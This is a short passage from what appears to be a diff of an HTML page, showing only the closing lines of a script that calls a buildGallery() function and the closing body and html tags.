+});
+
+buildGallery();
+</script>
+</body>
+</html>
